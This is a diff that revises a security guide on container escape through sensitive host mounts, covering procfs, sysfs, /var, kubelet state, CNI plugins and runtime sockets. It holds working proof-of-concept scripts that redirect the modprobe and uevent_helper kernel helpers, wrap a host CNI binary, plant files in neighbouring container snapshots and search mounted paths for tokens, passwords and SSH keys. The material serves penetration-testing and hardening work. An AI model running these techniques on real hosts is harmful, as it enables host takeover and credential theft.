@@ -8,6 +8,10 @@ Host mounts are one of the most important practical container-escape surfaces be
 
 This page exists separately from the individual protection pages because the abuse model is cross-cutting. A writable host mount is dangerous partly because of mount namespaces, partly because of user namespaces, partly because of AppArmor or SELinux coverage, and partly because of what exact host path was exposed. Treating it as its own topic makes the attack surface much easier to reason about.
 
+Also compare a host-writable directory with the corresponding path inside each container. If it is mounted over a directory of executable startup scripts, a lower-privileged host user may be able to plant code that a higher-privileged container entrypoint loads on its next restart. Confirm the exact bind source and destination, directory write/search permissions, entrypoint loop and executable-file requirement, runtime UID, and a real restart trigger. Container UID 0 is not automatically host UID 0; user-namespace mapping and mount policy determine the host effect. Passive review should report paths and permissions without writing a script or restarting the workload.
+
+A Linux container may sit inside a management VM that shares part of a separate Windows host filesystem. [VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) are one way host files become visible in a guest, but root in that VM is still a distinct identity from a Windows administrator. If the share exposes a readable user's SSH private key, treat it as a credential lead: verify the exact host-backed mount, key ownership and access, the matching account, and the Windows SSH server's **effective** authorized-key policy before concluding that it permits a host login. Modern [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) commonly uses a separate `administrators_authorized_keys` file for administrator accounts. Keep private-key contents out of routine enumeration output; mount and key-path metadata are enough for passive triage.
+
 ## `/proc` Exposure
 
 procfs contains both ordinary process information and high-impact kernel control interfaces. A bind mount such as `-v /proc:/host/proc` or a container view that exposes unexpected writable proc entries can therefore lead to information disclosure, denial of service, or direct host code execution.
@@ -17,15 +21,13 @@ High-value procfs paths include:
 - `/proc/sys/kernel/core_pattern`
 - `/proc/sys/kernel/modprobe`
 - `/proc/sys/vm/panic_on_oom`
-- `/proc/sys/fs/binfmt_misc`
+- `/proc/sys/fs/binfmt_misc/` (especially `register` and `status`)
 - `/proc/config.gz`
 - `/proc/sysrq-trigger`
 - `/proc/kmsg`
 - `/proc/kallsyms`
 - `/proc/[pid]/mem`
 - `/proc/kcore`
-- `/proc/kmem`
-- `/proc/mem`
 - `/proc/sched_debug`
 - `/proc/[pid]/mountinfo`
 
@@ -37,6 +39,8 @@ Start by checking which high-value procfs entries are visible or writable:
 for p in \
   /proc/sys/kernel/core_pattern \
   /proc/sys/kernel/modprobe \
+  /proc/sys/fs/binfmt_misc/status \
+  /proc/sys/fs/binfmt_misc/register \
   /proc/sysrq-trigger \
   /proc/kmsg \
   /proc/kallsyms \
@@ -72,8 +76,8 @@ The practical value of each path is different, and treating them all as if they 
   This is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`, Yama, and ptrace restrictions, so it is a powerful but conditional path.
 - `/proc/kcore`
   Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface.
-- `/proc/kmem` and `/proc/mem`
-  Historically high-impact raw memory interfaces. On many modern systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.
+- `/dev/kmem` and `/dev/mem`
+  These are historically high-impact raw-memory **device** interfaces, not procfs files. On many modern systems they are absent or heavily restricted, but a container that can open a host-mounted copy should treat the exposure as critical. Review them with other sensitive `/dev` mounts rather than searching for the nonexistent `/proc/kmem` or `/proc/mem` paths.
 - `/proc/sched_debug`
   Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
 - `/proc/[pid]/mountinfo`
@@ -88,23 +92,28 @@ mount | grep overlay
 
 These commands are useful because a number of host-execution tricks require turning a path inside the container into the corresponding path from the host's point of view.
 
-### Full Example: `modprobe` Helper Path Abuse
+### Example: Preparing A `modprobe` Helper Path
 
-If `/proc/sys/kernel/modprobe` is writable from the container and the helper path is interpreted in the host context, it can be redirected to an attacker-controlled payload:
+If `/proc/sys/kernel/modprobe` is writable from the container and the helper path is interpreted in the host context, it can be redirected to an attacker-controlled payload. The overlay upper directory must resolve from the host, and proof output must be written back into that same host-visible container layer if the container does not also mount host `/tmp`:
 
 ```bash
 [ -w /proc/sys/kernel/modprobe ] || exit 1
 host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
-cat <<'EOF' > /tmp/modprobe-payload
+[ -n "$host_path" ] || exit 1
+original_modprobe=$(cat /proc/sys/kernel/modprobe)
+cat > /tmp/modprobe-payload <<EOF
 #!/bin/sh
-id > /tmp/modprobe.out
+id > "$host_path/tmp/modprobe.out"
 EOF
 chmod +x /tmp/modprobe-payload
 echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
 cat /proc/sys/kernel/modprobe
+# Run only an authorized, lab-specific helper trigger here.
+cat /tmp/modprobe.out
+printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
 ```
 
-The exact trigger depends on the target and kernel behavior, but the important point is that a writable helper path can redirect a future kernel helper invocation into attacker-controlled host-path content.
+The exact trigger depends on the target and kernel behavior and is deliberately not guessed. Restore the original value before leaving the lab. The important point is that a writable helper path can redirect a future kernel helper invocation into attacker-controlled host-path content. A missing overlay `upperdir`, a path that the host cannot resolve, a read-only sysctl mount, or a kernel that never invokes the selected helper breaks this chain.
 
 ### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`
 
@@ -144,6 +153,8 @@ High-value sysfs paths include:
 
 These paths matter for different reasons. `/sys/class/thermal` can influence thermal-management behavior and therefore host stability in badly exposed environments. `/sys/kernel/vmcoreinfo` can leak crash-dump and kernel-layout information that helps with low-level host fingerprinting. `/sys/kernel/security` is the `securityfs` interface used by Linux Security Modules, so unexpected access there may expose or alter MAC-related state. EFI variable paths can affect firmware-backed boot settings, making them much more serious than ordinary configuration files. `debugfs` under `/sys/kernel/debug` is especially dangerous because it is intentionally a developer-oriented interface with far fewer safety expectations than hardened production-facing kernel APIs.
 
+Every sysfs entry in this list is **kernel-, configuration-, and hardware-dependent**. Current virtualized nodes commonly omit `uevent_helper`, EFI variables, and thermal-device entries entirely. Record an absent path as a negative prerequisite instead of assuming that an example from another kernel applies.
+
 Useful review commands for these paths are:
 
 ```bash
@@ -164,21 +175,32 @@ What makes those commands interesting:
 
 ### Full Example: `uevent_helper`
 
-If `/sys/kernel/uevent_helper` is writable, the kernel may execute an attacker-controlled helper when a `uevent` is triggered:
+`/sys/kernel/uevent_helper` is kernel- and configuration-dependent and is absent on many current systems. If it exists, is writable, and a usable `uevent` trigger is available, the kernel may execute an attacker-controlled helper. Proof output must use a path that is visible from both the host and container views:
 
 ```bash
-cat <<'EOF' > /evil-helper
+[ -w /sys/kernel/uevent_helper ] || exit 1
+host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
+[ -n "$host_path" ] || exit 1
+original_helper=$(cat /sys/kernel/uevent_helper)
+cat > /evil-helper <<EOF
 #!/bin/sh
-id > /output
+id > "$host_path/output"
 EOF
 chmod +x /evil-helper
-host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
-echo change > /sys/class/mem/null/uevent
+# This virtual-device path is a common lab trigger, but is not present everywhere.
+uevent_file=/sys/class/mem/null/uevent
+if [ ! -w "$uevent_file" ]; then
+  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
+  echo "No writable, pre-approved uevent trigger was found" >&2
+  exit 1
+fi
+echo change > "$uevent_file"
 cat /output
+printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
 ```
 
-The reason this works is that the helper path is interpreted from the host's point of view. Once triggered, the helper runs in the host context rather than inside the current container.
+The reason this works is that the helper path is interpreted from the host's point of view. Once triggered, the helper runs in the host context rather than inside the current container. `/sys/class/mem/null/uevent` is one concrete trigger on kernels that expose it; other devices may expose their own `uevent` files, but do not select one blindly on real hardware. Restore the original value before leaving the lab. Do not report this technique as available when the helper file or a controlled trigger is absent.
 
 ## `/var` Exposure
 
@@ -217,15 +239,17 @@ find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n
 
 If the mounted `/var` exposes writable snapshot contents of another workload, the attacker may be able to alter application files, plant web content, or change startup scripts without touching the current container configuration.
 
-Concrete abuse ideas once writable snapshot content is found:
+On a **disposable lab workload**, writable snapshot content can demonstrate application tampering, secret recovery, or lateral movement. Map the runtime container ID to the exact snapshot first and never edit an unrelated or production snapshot:
 
 ```bash
 echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
 grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
-find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
+find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
 ```
 
 These commands are useful because they show the three main impact families of mounted `/var`: application tampering, secret recovery, and lateral movement into neighboring workloads.
+
+Direct snapshot writes bypass the runtime's normal state management and can corrupt the container or destroy evidence. Read-only discovery was reproduced locally against Docker `overlay2`: a marker written in a neighboring disposable container appeared below `/var/lib/docker/overlay2/<id>/diff/`. Keep actual snapshot modification limited to a disposable container created for that test.
 
 ## Kubelet State, Plugins, And CNI Paths
 
@@ -271,20 +295,25 @@ plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
 mv "$plugin" "${plugin}.orig"
 cat <<'EOF' > "$plugin"
 #!/bin/sh
-id > /tmp/cni-triggered
+id > "$(dirname "$0")/.cni-triggered"
 exec "$(dirname "$0")/$(basename "$0").orig" "$@"
 EOF
 chmod +x "$plugin"
 echo "wait for the next pod scheduled on this node"
+cat "$(dirname "$plugin")/.cni-triggered"
+mv "${plugin}.orig" "$plugin"
+rm -f "$(dirname "$plugin")/.cni-triggered"
 ```
 
-This is not as immediate as a mounted `docker.sock`, but it is often more realistic in compromised Kubernetes infrastructure pods. The important point is that the modified binary is later executed by the host network setup flow, not by the current container.
+This is not as immediate as a mounted `docker.sock`, but it is often more realistic in compromised Kubernetes infrastructure pods. The marker is written beside the mounted plugin so the container can retrieve it even without a host-root or host-`/tmp` mount. The wrapper preserves the original arguments and standard input, then the example restores the original binary. The important point is that the modified binary is later executed by the host network setup flow, not by the current container. Use only a disposable node because an invalid wrapper can prevent new Pod sandboxes from receiving networking.
 
 ## Runtime Sockets
 
 Sensitive host mounts often include runtime sockets rather than full directories. These are so important that they deserve explicit repetition here:
 
 ```text
+/var/run/docker.sock
+/run/docker.sock
 /run/containerd/containerd.sock
 /var/run/crio/crio.sock
 /run/podman/podman.sock
@@ -304,6 +333,8 @@ crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
 ```
 
 If one of these succeeds, the path from "mounted socket" to "start a more privileged sibling container" is usually much shorter than any kernel breakout path.
+
+The same daemon access can also establish **host persistence**. A helper container with a writable host-root bind mount can receive files through `docker cp`, then use `docker exec` to place an SSH key, service unit, or other persistence file under the mounted host path. The security boundary is the daemon's authority to create the host mount; `docker cp` is only a staging step. Audit both newly created containers and writes to host authentication or startup paths after a runtime socket is exposed.
 
 ## Writable Host Path Task Hijack
 
@@ -326,6 +357,14 @@ chmod +x /host/path/to/hook.sh
 
 The interesting part is the trust boundary: the write happens from inside the container, but execution happens later in the host service context. This turns a narrow hostPath or bind mount into a delayed host-code-execution primitive.
 
+## Root-Owned Files on a Shared Host Path
+
+A container account that can become root may be able to place a root-owned file on a writable path also used by the host. If container UID 0 maps to host UID 0, both views refer to the same file, and the host mount honors SUID execution, a host user who can run a root-owned SUID executable on that path may cross the host privilege boundary. The container does not have to run with `--privileged` for this particular file-ownership issue. See [user namespace mappings](protections/namespaces/user-namespace.md) and the [SUID discussion](privileged-containers.md) for the separate conditions.
+
+Review the path from **both sides**: compare a benign file's ownership and identity, check the container's `uid_map` and `gid_map`, and inspect the host's mount options and execution policy. Container-side `rw` without `nosuid` is only a candidate; it cannot establish host ownership, host mount flags, a host user's access, or whether AppArmor/SELinux blocks execution. `noexec` constrains execution in the view where it applies. The `shared:` and `master:` tags in `/proc/self/mountinfo` describe mount propagation, not whether the file's contents are shared with the host. A bind mount may lack those tags. Credential reuse that provides a host login is a separate step from the shared-file privilege boundary.
+
+The host's runtime storage can create a similar path even without an explicit bind mount. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) allowed an unprivileged host user to traverse Docker data subdirectories and execute files from a container filesystem; Moby fixed the permissions in 20.10.9 and notes that running containers must be restarted to correct their directories. Review exact mounted `overlay2/<id>/merged` paths and each parent's search permission, then establish whether container UID 0 maps to host UID 0, a real root-owned SetUID executable is present and reachable, and the host view permits SetUID execution. Rootless or user-namespace-remapped containers, `nosuid`, `noexec`, `no_new_privs`, and MAC policy can change the result. A runtime version or traversable path alone is a review lead, not proof of host-root execution; inspect mount and file metadata without running a candidate executable.
+
 ## Mount-Related CVEs
 
 Host mounts also intersect with runtime vulnerabilities. Important recent examples include:
@@ -344,7 +383,7 @@ Use these commands to locate the highest-value mount exposures quickly:
 ```bash
 mount
 find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
-find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
+find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
 find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
 ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
 find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
@@ -357,6 +396,20 @@ What is interesting here:
 - Writable proc/sys entries often mean the mount is exposing host-global kernel controls rather than a safe container view.
 - Mounted `/var` paths deserve credential and neighboring-workload review, not just filesystem review.
 - Kubelet state directories and CNI/plugin paths deserve the same priority as runtime sockets because they often sit directly on the node's pod-creation and credential-distribution path.
+
+## Local Validation Status
+
+The practical chains on this page were checked against a local Linux minikube node. The validation reproduced:
+
+- read and write access through a temporary writable hostPath
+- discovery of projected ServiceAccount tokens and mounted Secrets through `/var/lib/kubelet/pods`
+- successful Kubernetes API authentication with a live token recovered from that mounted kubelet state
+- read-only discovery of a neighboring Docker `overlay2` filesystem through mounted `/var`
+- Docker API creation of a sibling container with a read-only host bind through a mounted `docker.sock`
+- delayed host execution through a temporary host-consumed hook
+- a CNI-wrapper simulation that preserved the original plugin's arguments, standard input, and execution
+
+The same node exposed `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore`, and `config.gz`, but it did not expose `uevent_helper`, EFI variables, thermal entries, or `sched_debug`. Destructive kernel triggers were not executed. This confirms that host-root, `/var`, kubelet-state, socket, and host-consumer chains are reproducible, while procfs/sysfs helper techniques must remain conditional on the exact kernel, mount mode, payload path, and trigger.
 
 ## References
 
